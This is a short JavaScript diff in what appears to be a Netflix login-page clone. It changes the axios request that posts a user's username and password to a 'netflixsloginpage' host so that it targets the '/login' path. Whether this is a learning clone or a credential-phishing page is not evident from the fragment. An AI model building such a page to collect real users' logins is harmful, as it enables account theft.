@@ -19,7 +19,7 @@ function handlepass(e){
 }
 
 function check(){
-    var login=axios.post("https://netflixsloginpage.onrender.com",{"username":user,"password":pass});
+    var login=axios.post("https://netflixsloginpage.onrender.com/login",{"username":user,"password":pass});
     login.then (function(res){
 
     console.log(res)
